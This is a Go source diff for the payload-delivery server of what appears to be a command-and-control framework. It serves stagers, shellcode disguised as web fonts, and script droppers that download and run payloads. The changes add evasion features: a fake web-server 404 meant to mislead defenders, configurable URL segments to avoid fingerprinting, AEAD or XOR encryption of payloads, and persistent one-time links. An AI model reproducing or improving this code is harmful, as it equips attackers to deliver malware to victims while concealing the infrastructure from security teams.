@@ -3,12 +3,15 @@ package delivery
 import (
 	"BackendTemplate/pkg/config"
 	"BackendTemplate/pkg/database"
+	"BackendTemplate/pkg/utils/logx"
 	"crypto/rand"
 	"crypto/subtle"
 	"encoding/hex"
 	"fmt"
+	"io"
 	"net/http"
 	"net/url"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -42,9 +45,15 @@ type Profile struct {
 	Meta    database.WebDelivery
 	Payload Payload
 	// one-time flags: after successful serve, mark consumed
+	// 内存 CAS 负责并发互斥，消费结果同时落库（full_used/stager_used/sc_used），
+	// 否则服务重启后一次性 URL 会复活。
 	fullUsed   int32
 	stagerUsed int32
 	scUsed     int32
+	// hits 是命中数的原子计数（MaxDownloads 的并发闸门也依赖它）。
+	hits int64
+	// statsMu 串行化 LastHit* 与 DB 写入，避免并发提交回写较小的旧值。
+	statsMu sync.Mutex
 }
 
 // Hub is the central delivery router (shared mode)
@@ -99,7 +108,14 @@ func (h *Hub) Register(meta database.WebDelivery, payload Payload) {
 	if meta.PublicKey == "" {
 		meta.PublicKey = ShortKey()
 	}
-	p := &Profile{Meta: meta, Payload: payload}
+	p := &Profile{
+		Meta:       meta,
+		Payload:    payload,
+		fullUsed:   int32(meta.FullUsed),
+		stagerUsed: int32(meta.StagerUsed),
+		scUsed:     int32(meta.ScUsed),
+		hits:       meta.HitCount,
+	}
 	h.mu.Lock()
 	h.byKey[meta.PublicKey] = p
 	if meta.ListeningPort != "" && meta.ListeningPort != "shared" {
@@ -177,6 +193,11 @@ func effectiveDeliveryDefaults() config.DeliveryConfig {
 	cfg.CacheMaxAge = d.CacheMaxAge
 	cfg.CORSAllowOrigin = d.CORSAllowOrigin
 	cfg.TrustProxyHeaders = d.TrustProxyHeaders
+	cfg.FullSegment = d.FullSegment
+	cfg.StagerSegment = d.StagerSegment
+	cfg.ScSegment = d.ScSegment
+	cfg.WoffSegment = d.WoffSegment
+	cfg.FullContentType = d.FullContentType
 	// server.external_ip 可作为 host 回退
 	if cfg.DefaultHost == "" && externalIP != "" {
 		if serverPort > 0 && serverPort != 80 && serverPort != 443 {
@@ -199,6 +220,39 @@ func normalizeScheme(s string, forceHTTPS bool) string {
 	return "http"
 }
 
+// sanitizeAttachmentName 去掉会破坏 Content-Disposition 的字符（引号/反斜杠/路径分隔符/控制字符）。
+func sanitizeAttachmentName(name string) string {
+	clean := strings.Map(func(r rune) rune {
+		if r < 0x20 || r == '"' || r == '\\' || r == '/' || r == ';' {
+			return '_'
+		}
+		return r
+	}, name)
+	clean = strings.TrimSpace(clean)
+	if clean == "" {
+		return "payload.bin"
+	}
+	return clean
+}
+
+// notFoundResponse 伪装成常见 Web 服务器的 404 页面。
+// Go 默认的 "404 page not found" 纯文本本身就是投递路由的指纹。
+const notFoundResponse = `<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>404 Not Found</title>
+<style>body{background:#fff;color:#444;font:14px/1.6 -apple-system,Segoe UI,Roboto,Arial,sans-serif;margin:0}
+.wrap{max-width:720px;margin:12vh auto;padding:0 24px}h1{font-size:36px;font-weight:600;margin:0 0 12px}
+p{color:#666}</style></head>
+<body><div class="wrap"><h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p></div></body></html>`
+
+// writeNotFound 输出统一、无路由语义的 404（所有投递失败路径共用）。
+func writeNotFound(w http.ResponseWriter, r *http.Request) {
+	ApplyDeliveryHeaders(w, "text/html; charset=utf-8")
+	w.Header().Set("Content-Length", strconv.Itoa(len(notFoundResponse)))
+	w.WriteHeader(http.StatusNotFound)
+	_, _ = io.WriteString(w, notFoundResponse)
+}
+
 func normalizeBasePath(bp string) string {
 	bp = strings.TrimSpace(bp)
 	if bp == "" || bp == "/" {
@@ -208,6 +262,60 @@ func normalizeBasePath(bp string) string {
 		bp = "/" + bp
 	}
 	return strings.TrimRight(bp, "/")
+}
+
+// RoutePrefix 返回公开投递路径前缀（默认 /d，可由 delivery.route_prefix 配置）。
+func RoutePrefix() string {
+	return config.DeliveryRoutePrefix()
+}
+
+// ResourceSegments 是四个公开资源段名。全部可配置，避免固定 /full /stager /sc /woff 指纹。
+type ResourceSegments struct {
+	Full   string
+	Stager string
+	Sc     string
+	Woff   string
+}
+
+// normalizeSegment 把配置值收敛成单个合法路径段；非法值回退默认。
+func normalizeSegment(s, fallback string) string {
+	s = strings.Trim(strings.TrimSpace(s), "/")
+	if s == "" || strings.ContainsAny(s, "/?#") {
+		return fallback
+	}
+	for _, r := range s {
+		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
+			r == '-' || r == '_' || r == '.' || r == '~' {
+			continue
+		}
+		return fallback
+	}
+	// 与路由前缀同名会让 /d/d/... 产生歧义
+	if "/"+s == RoutePrefix() {
+		return fallback
+	}
+	// 这些是 Hub 的兼容别名/脚本资源名，占用后会产生路由歧义
+	switch strings.ToLower(s) {
+	case "d", "file", "payload", "bin", "ps1", "vbs", "bat", "hta", "lnk", "sh":
+		return fallback
+	}
+	return s
+}
+
+// ResourceNames 返回规范化后的资源段名；任一段重复时整体回退默认值。
+func ResourceNames() ResourceSegments {
+	d := effectiveDeliveryDefaults()
+	n := ResourceSegments{
+		Full:   normalizeSegment(d.FullSegment, ResFull),
+		Stager: normalizeSegment(d.StagerSegment, ResStager),
+		Sc:     normalizeSegment(d.ScSegment, ResShellcode),
+		Woff:   normalizeSegment(d.WoffSegment, ResWoff),
+	}
+	if n.Full == n.Stager || n.Full == n.Sc || n.Full == n.Woff ||
+		n.Stager == n.Sc || n.Stager == n.Woff || n.Sc == n.Woff {
+		return ResourceSegments{Full: ResFull, Stager: ResStager, Sc: ResShellcode, Woff: ResWoff}
+	}
+	return n
 }
 
 func stripDefaultPort(host, scheme string, omit bool) string {
@@ -299,18 +407,19 @@ func BuildPublicURLs(meta *database.WebDelivery, mainPort int) {
 	}
 	keyPath = strings.Trim(keyPath, "/")
 
-	// {scheme}://{host}{basePath}/d/{key}
-	base := fmt.Sprintf("%s://%s%s/d/%s", scheme, host, basePath, keyPath)
+	// {scheme}://{host}{basePath}{prefix}/{key}
+	base := fmt.Sprintf("%s://%s%s%s/%s", scheme, host, basePath, RoutePrefix(), keyPath)
 
 	fname := meta.FileName
 	if fname == "" {
 		fname = "payload"
 	}
-	meta.ServerAddress = base + "/full/" + fname
-	meta.StagerURL = base + "/stager"
-	meta.ShellcodeURL = base + "/sc"
+	names := ResourceNames()
+	meta.ServerAddress = base + "/" + names.Full + "/" + url.PathEscape(fname)
+	meta.StagerURL = base + "/" + names.Stager
+	meta.ShellcodeURL = base + "/" + names.Sc
 	if strings.ToLower(meta.OS) == "windows" {
-		meta.ShellcodeURL = base + "/woff"
+		meta.ShellcodeURL = base + "/" + names.Woff
 	}
 }
 
@@ -342,18 +451,26 @@ func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusNoContent)
 		return
 	}
-	// path: /d/{key}/full[/name] | /d/{key}/stager | /d/{key}/sc | /d/{key}/woff
-	// 兼容 CDN base_path：允许 /static/d/... 形式（反代可能保留前缀）
+	// path: {prefix}/{key}/full[/name] | .../stager | .../sc | .../woff
+	// 兼容 CDN base_path：允许 /static{prefix}/... 形式（反代可能保留前缀）
+	prefix := RoutePrefix()
 	path := r.URL.Path
-	if i := strings.Index(path, "/d/"); i >= 0 {
-		path = path[i+len("/d/"):]
+	if i := strings.Index(path, prefix+"/"); i >= 0 {
+		path = path[i+len(prefix)+1:]
+	} else if prefix != "/d" {
+		// 改过前缀后仍接受旧的 /d/ 形式，避免升级瞬间旧载荷全体 404
+		if i := strings.Index(path, "/d/"); i >= 0 {
+			path = path[i+len("/d/"):]
+		} else {
+			path = strings.TrimPrefix(path, prefix)
+		}
 	} else {
-		path = strings.TrimPrefix(path, "/d/")
+		path = strings.TrimPrefix(path, prefix)
 	}
 	path = strings.Trim(path, "/")
 	parts := strings.Split(path, "/")
 	if len(parts) < 2 {
-		http.NotFound(w, r)
+		writeNotFound(w, r)
 		return
 	}
 	key := parts[0]
@@ -375,13 +492,13 @@ func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		h.mu.RUnlock()
 	}
 	if !ok || p == nil {
-		http.NotFound(w, r)
+		writeNotFound(w, r)
 		return
 	}
 	if p.Meta.Status != 1 {
 		// 伪装 404：投递已关闭不暴露语义
 		logAccess(p, resource, r, http.StatusNotFound, 0)
-		http.NotFound(w, r)
+		writeNotFound(w, r)
 		return
 	}
 
@@ -400,17 +517,19 @@ func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	} else if !checkAccess(p, r) {
 		logAccess(p, resource, r, http.StatusNotFound, 0)
 		// 伪装 404：让蓝队以为是"URL 不存在"，不暴露令牌/访问控制语义
-		http.NotFound(w, r)
+		writeNotFound(w, r)
 		return
 	}
 
 	var data []byte
 	var contentType string
 	var filename string
-	var oneTimeFlag *int32
+	var oneTimeColumn string
 
-	switch resource {
-	case ResFull, "file", "payload":
+	names := ResourceNames()
+	switch {
+	case resource == names.Full || resource == ResFull || resource == "file" || resource == "payload":
+		resource = ResFull
 		data = p.Payload.Full
 		contentType = p.Meta.ContentType
 		if contentType == "" {
@@ -423,10 +542,13 @@ func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		if filename == "" {
 			filename = "payload.bin"
 		}
-		oneTimeFlag = &p.fullUsed
-	case ResStager:
+		oneTimeColumn = "full_used"
+	case resource == names.Stager || resource == ResStager:
+		resource = ResStager
 		data = p.Payload.Stager
-		contentType = p.Meta.ContentType
+		// stager 与 shellcode 同属 stage 资源，应使用 StageContentType（如 font/woff），
+		// 而不是完整载荷的 ContentType。
+		contentType = p.Meta.StageContentType
 		if contentType == "" {
 			contentType = "application/octet-stream"
 		}
@@ -434,16 +556,18 @@ func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		if p.Meta.OS == "windows" {
 			filename = "stager.exe"
 		}
-		oneTimeFlag = &p.stagerUsed
-	case ResShellcode, "bin":
+		oneTimeColumn = "stager_used"
+	case resource == names.Sc || resource == ResShellcode || resource == "bin":
+		resource = ResShellcode
 		data = p.Payload.Shellcode
 		contentType = p.Meta.StageContentType
 		if contentType == "" {
 			contentType = "application/octet-stream"
 		}
 		filename = "payload.bin"
-		oneTimeFlag = &p.scUsed
-	case ResWoff:
+		oneTimeColumn = "sc_used"
+	case resource == names.Woff || resource == ResWoff:
+		resource = ResWoff
 		data = p.Payload.Shellcode
 		if len(data) == 0 {
 			data = p.Payload.Stager
@@ -456,11 +580,17 @@ func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		if p.Meta.FileName == "" {
 			filename = "font.woff"
 		}
-		oneTimeFlag = &p.scUsed
-	case ResPS1, ResVBS, ResBat, ResHta, ResLnk, ResSh:
-		// 脚本载荷：运行时从 /d/{key}/full 拉取并执行；?mode=embed 内嵌 base64（ps1/bat 支持）
+		oneTimeColumn = "sc_used"
+	case resource == ResPS1 || resource == ResVBS || resource == ResBat || resource == ResHta || resource == ResLnk || resource == ResSh:
+		// 脚本载荷：运行时从下载地址拉取并执行；?mode=embed 内嵌 base64（ps1/bat 支持）
+		if p.Meta.CryptoMode == "aead" {
+			// 脚本模板不具备 AEAD 解密能力，返回伪装 404 而不是下发一段必然执行失败的脚本
+			writeNotFound(w, r)
+			logAccess(p, resource, r, http.StatusNotFound, 0)
+			return
+		}
 		if len(p.Payload.Full) == 0 {
-			http.Error(w, "resource not available", http.StatusNotFound)
+			writeNotFound(w, r)
 			logAccess(p, resource, r, http.StatusNotFound, 0)
 			return
 		}
@@ -484,67 +614,75 @@ func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		if fname == "" {
 			fname = "payload.bin"
 		}
-		fullURL := fmt.Sprintf("%s://%s%s/d/%s/full/%s", scheme, host, basePath, keyPath, url.PathEscape(fname))
-		// 【修复】配置了 AccessToken 的投递，下载 URL 必须携带 ?t=token，
-		// 否则脚本运行时拉取 full 载荷必然 403
-		if p.Meta.AccessToken != "" {
-			fullURL += "?t=" + url.QueryEscape(p.Meta.AccessToken)
-		}
-		data = GenerateScript(resource, r.URL.Query().Get("mode"), fullURL, p.Meta.DownloadPath, p.Meta.SaveFilename, p.Meta.Pass, p.Payload.Full)
+		fullURL := fmt.Sprintf("%s://%s%s%s/%s/%s/%s", scheme, host, basePath, RoutePrefix(), keyPath, names.Full, url.PathEscape(fname))
+		// 令牌不再拼进 URL：交给脚本放进 X-Delivery-Token 头，
+		// 避免 ?t= 进入代理/网关日志与浏览器历史。
+		data = GenerateScriptWithToken(resource, r.URL.Query().Get("mode"), fullURL, p.Meta.DownloadPath, p.Meta.SaveFilename, p.Meta.Pass, p.Meta.AccessToken, p.Payload.Full)
 		contentType = ScriptContentType(resource)
 		filename = ScriptFileName(resource)
 	default:
-		http.NotFound(w, r)
+		writeNotFound(w, r)
 		return
 	}
 
 	if len(data) == 0 {
 		// 伪装 404
-		http.NotFound(w, r)
+		writeNotFound(w, r)
 		logAccess(p, resource, r, http.StatusNotFound, 0)
 		return
 	}
 
-	// one-time check（CAS 原子消费：并发请求只有一个能通过，避免双重消费）
-	if p.Meta.OneTime == 1 && oneTimeFlag != nil {
-		if !atomic.CompareAndSwapInt32(oneTimeFlag, 0, 1) {
-			// 一次性链接已用：伪装 404
-			http.NotFound(w, r)
-			logAccess(p, resource, r, http.StatusNotFound, 0)
-			return
+	// 载荷加密必须先于限额/一次性消费：加密失败时不能白白烧掉名额或一次性 URL。
+	//   - aead：加密 full 与 shellcode/woff（Windows Stager 拉 shellcode、Linux Stager 拉 full，
+	//     两者都内置密钥解密）；Stager 自身必须保持可执行，不加密；脚本模板不支持 AEAD。
+	//   - xor：保留旧行为，full/stager/sc/woff 全部单字节异或（脚本模板不动）。
+	if p.Meta.CryptoMode == "aead" {
+		if resource == ResFull || resource == ResShellcode || resource == ResWoff {
+			enc, err := AEADEncrypt(data, p.Meta.DeliveryKey)
+			if err != nil {
+				logx.Infof("[Delivery] AEAD 加密失败 key=%s: %v\n", p.Meta.PublicKey, err)
+				writeNotFound(w, r)
+				logAccess(p, resource, r, http.StatusNotFound, 0)
+				return
+			}
+			data = enc
 		}
-	}
-
-	// max downloads
-	if p.Meta.MaxDownloads > 0 && p.Meta.HitCount >= int64(p.Meta.MaxDownloads) {
-		// 达到下载上限：伪装 404
-		http.NotFound(w, r)
-		logAccess(p, resource, r, http.StatusNotFound, 0)
-		return
-	}
-
-	// 【隐身衣】Stage 载荷 XOR 混淆：配置了 XorKey 的投递，二进制载荷（full/stager/
-	// shellcode/woff）加密下发，Stager/客户端内置同 key 解密。脚本类（ps1/vbs/bat/hta）
-	// 是文本模板不动。
-	if p.Meta.XorKey != 0 && resource != ResPS1 && resource != ResVBS && resource != ResBat && resource != ResHta && resource != ResLnk && resource != ResSh {
+	} else if (p.Meta.CryptoMode == "xor" || (p.Meta.CryptoMode == "" && p.Meta.XorKey != 0)) && p.Meta.XorKey != 0 && resource != ResPS1 && resource != ResVBS && resource != ResBat && resource != ResHta && resource != ResLnk && resource != ResSh {
 		enc, err := XorEncode(data, byte(p.Meta.XorKey))
 		if err == nil {
 			data = enc
 		}
 	}
 
+	// 先原子预占一个下载名额（同时承担 MaxDownloads 闸门与命中计数）。
+	// 顺序很重要：先限额、后消费一次性，否则被上限拒绝的请求会白白烧掉一次性 URL。
+	if !p.reserveHit() {
+		// 达到下载上限：伪装 404
+		writeNotFound(w, r)
+		logAccess(p, resource, r, http.StatusNotFound, 0)
+		return
+	}
+	// one-time check（CAS 原子消费：并发请求只有一个能通过，避免双重消费）
+	if p.Meta.OneTime == 1 && oneTimeColumn != "" {
+		if !p.consumeOneTime(oneTimeColumn) {
+			p.releaseHit()
+			// 一次性链接已用：伪装 404
+			writeNotFound(w, r)
+			logAccess(p, resource, r, http.StatusNotFound, 0)
+			return
+		}
+	}
+
 	ApplyDeliveryHeaders(w, contentType)
 	// only set attachment for obvious binary downloads; fonts/js look more natural inline
 	if !strings.Contains(contentType, "font") && !strings.Contains(contentType, "javascript") && !strings.Contains(contentType, "image") {
-		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
+		w.Header().Set("Content-Disposition", "attachment; filename="+sanitizeAttachmentName(filename))
 	}
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
 	n, _ := w.Write(data)
 
-	// one-time 已在下载前 CAS 置位，无需再次写入
-
-	// stats
-	incHit(p, clientIP(r))
+	// stats：名额在下载前已预占，这里只提交时间/IP 与持久化计数
+	p.commitHit(clientIP(r))
 	logAccess(p, resource, r, http.StatusOK, int64(n))
 }
 
@@ -590,45 +728,88 @@ func checkAccess(p *Profile, r *http.Request) bool {
 	return true
 }
 
-func clientIP(r *http.Request) string {
-	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
-		parts := strings.Split(xff, ",")
-		return strings.TrimSpace(parts[0])
+// reserveHit 原子预占一个下载名额。
+// max=0 表示不限额，只做计数；max>0 时用 CAS 保证并发下不会超过上限。
+func (p *Profile) reserveHit() bool {
+	max := int64(p.Meta.MaxDownloads)
+	for {
+		cur := atomic.LoadInt64(&p.hits)
+		if max > 0 && cur >= max {
+			return false
+		}
+		if atomic.CompareAndSwapInt64(&p.hits, cur, cur+1) {
+			return true
+		}
 	}
-	if xri := r.Header.Get("X-Real-IP"); xri != "" {
-		return xri
+}
+
+// releaseHit 归还预占名额（一次性校验失败等未真正下发的路径）。
+func (p *Profile) releaseHit() {
+	if atomic.AddInt64(&p.hits, -1) < 0 {
+		atomic.StoreInt64(&p.hits, 0)
+	}
+}
+
+// consumeOneTime 原子消费一次性资源并把状态落库。
+// CAS 失败=并发请求已消费；落库失败只记录日志，内存态仍然生效。
+func (p *Profile) consumeOneTime(column string) bool {
+	var flag *int32
+	switch column {
+	case "full_used":
+		flag = &p.fullUsed
+	case "stager_used":
+		flag = &p.stagerUsed
+	case "sc_used":
+		flag = &p.scUsed
+	default:
+		return false
+	}
+	if !atomic.CompareAndSwapInt32(flag, 0, 1) {
+		return false
+	}
+	if database.DB() != nil {
+		if err := database.Deliveries().MarkOneTimeUsed(p.Meta.ID, p.Meta.PublicKey, column); err != nil {
+			logx.Infof("[Delivery] 一次性状态落库失败 key=%s col=%s: %v\n", p.Meta.PublicKey, column, err)
+		}
+	}
+	return true
+}
+
+// commitHit 提交成功下载的时间/IP 与命中计数。
+// statsMu 保证并发提交不会把更小的旧计数写回数据库。
+func (p *Profile) commitHit(ip string) {
+	p.statsMu.Lock()
+	defer p.statsMu.Unlock()
+	at := time.Now().Format("2006-01-02 15:04:05")
+	p.Meta.LastHitAt = at
+	p.Meta.LastHitIP = ip
+	n := atomic.LoadInt64(&p.hits)
+	p.Meta.HitCount = n
+	if database.DB() == nil {
+		return
+	}
+	if err := database.Deliveries().UpdateHitStats(p.Meta.ID, p.Meta.PublicKey, n, at, ip); err != nil {
+		logx.Infof("[Delivery] 命中统计落库失败 key=%s: %v\n", p.Meta.PublicKey, err)
+	}
+}
+
+func clientIP(r *http.Request) string {
+	// 只有显式配置信任反代头时才采信，否则客户端可以伪造 X-Forwarded-For
+	// 污染访问日志 / 令牌使用记录。
+	if effectiveDeliveryDefaults().TrustProxyHeaders {
+		if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
+			parts := strings.Split(xff, ",")
+			return strings.TrimSpace(parts[0])
+		}
+		if xri := r.Header.Get("X-Real-IP"); xri != "" {
+			return xri
+		}
 	}
 	addr := r.RemoteAddr
 	if i := strings.LastIndex(addr, ":"); i > 0 {
 		return addr[:i]
 	}
 	return addr
-}
-
-func incHit(p *Profile, ip string) {
-	p.Meta.HitCount++
-	p.Meta.LastHitAt = time.Now().Format("2006-01-02 15:04:05")
-	p.Meta.LastHitIP = ip
-	// best-effort DB update
-	if database.DB() != nil {
-		_, _ = database.DB().Where("public_key = ?", p.Meta.PublicKey).
-			Cols("hit_count", "last_hit_at", "last_hit_ip").
-			Update(&database.WebDelivery{
-				HitCount:  p.Meta.HitCount,
-				LastHitAt: p.Meta.LastHitAt,
-				LastHitIP: p.Meta.LastHitIP,
-			})
-		// also try by listening_port for legacy rows without public_key index match
-		if p.Meta.ID > 0 {
-			_, _ = database.DB().ID(p.Meta.ID).
-				Cols("hit_count", "last_hit_at", "last_hit_ip").
-				Update(&database.WebDelivery{
-					HitCount:  p.Meta.HitCount,
-					LastHitAt: p.Meta.LastHitAt,
-					LastHitIP: p.Meta.LastHitIP,
-				})
-		}
-	}
 }
 
 func logAccess(p *Profile, resource string, r *http.Request, code int, bytes int64) {
@@ -657,11 +838,18 @@ type DefaultsView struct {
 	CacheMaxAge       int    `json:"cacheMaxAge"`
 	CORSAllowOrigin   string `json:"corsAllowOrigin"`
 	TrustProxyHeaders bool   `json:"trustProxyHeaders"`
+	RoutePrefix       string `json:"routePrefix"`
+	FullSegment       string `json:"fullSegment"`
+	StagerSegment     string `json:"stagerSegment"`
+	ScSegment         string `json:"scSegment"`
+	WoffSegment       string `json:"woffSegment"`
+	FullContentType   string `json:"fullContentType"`
 }
 
 // GetDefaultsView 导出全局 delivery 配置快照
 func GetDefaultsView() DefaultsView {
 	d := effectiveDeliveryDefaults()
+	names := ResourceNames()
 	return DefaultsView{
 		DefaultScheme:     d.DefaultScheme,
 		DefaultHost:       d.DefaultHost,
@@ -671,5 +859,11 @@ func GetDefaultsView() DefaultsView {
 		CacheMaxAge:       d.CacheMaxAge,
 		CORSAllowOrigin:   d.CORSAllowOrigin,
 		TrustProxyHeaders: d.TrustProxyHeaders,
+		RoutePrefix:       RoutePrefix(),
+		FullSegment:       names.Full,
+		StagerSegment:     names.Stager,
+		ScSegment:         names.Sc,
+		WoffSegment:       names.Woff,
+		FullContentType:   DefaultFullContentType("windows"),
 	}
 }
